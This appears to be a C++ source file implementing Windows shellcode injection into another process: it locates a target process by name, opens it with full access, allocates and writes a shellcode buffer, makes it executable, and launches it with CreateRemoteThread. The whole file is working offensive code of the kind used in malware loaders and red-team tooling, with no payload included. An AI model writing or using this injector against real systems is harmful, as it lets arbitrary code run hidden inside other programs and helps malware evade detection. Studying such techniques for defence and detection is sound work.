#include "injection.h"
#include <TlHelp32.h>
#include <iostream>

HANDLE GetTargetHandle(IN LPCSTR targetProcessName) {
	HANDLE snapshot = NULL;
	HANDLE hProcess = NULL;
	BOOL found = FALSE;
	PROCESSENTRY32 entry = { .dwSize = sizeof(PROCESSENTRY32) };

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (snapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "[-] Failed to create ToolHelp32 snapshot: " << GetLastError() << std::endl;
		return NULL;
	}

	if (!Process32First(snapshot, &entry)) {
		std::cerr << "[-] Failed to load first process entry: " << GetLastError() << std::endl;
		CloseHandle(snapshot);
		return NULL;
	}

	do {
		if (_stricmp(targetProcessName, entry.szExeFile) == 0) {
			found = TRUE;
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
			if (hProcess == NULL) {
				std::cerr << "[-] Found process, but failed to open: " << GetLastError() << std::endl;
				CloseHandle(snapshot);
				return NULL;
			}
			break;
		}
	} while (Process32Next(snapshot, &entry));

	if (found) return hProcess;

	std::cout << "[-] Failed to find process..." << std::endl;

	return NULL;
}

LPVOID WriteShellcode(IN HANDLE hProcess, IN UCHAR* cShellcode, IN SIZE_T szShellcode) {
	DWORD dwOldProtect;
	LPVOID pBuffer = VirtualAllocEx(hProcess, NULL, szShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pBuffer == NULL) {
		std::cerr << "[-] Failed to allocate buffer: " << GetLastError() << std::endl;
		return NULL;
	}

	if (!WriteProcessMemory(hProcess, pBuffer, cShellcode, szShellcode, NULL)) {
		std::cerr << "[-] Failed to write payload to buffer: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, pBuffer, 0, MEM_FREE);
		return NULL;
	}

	if (!VirtualProtectEx(hProcess, pBuffer, szShellcode, PAGE_EXECUTE_READ, &dwOldProtect)) {
		std::cerr << "[-] Failed to make region executable: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, pBuffer, 0, MEM_FREE);
		return NULL;
	}

	return pBuffer;
}

BOOL Execute(IN HANDLE hProcess, IN LPVOID pBuffer) {
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pBuffer), NULL, 0, NULL);
	if (hThread == NULL) {
		std::cerr << "[-] Failed to create thread: " << GetLastError() << std::endl;
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	return TRUE;
}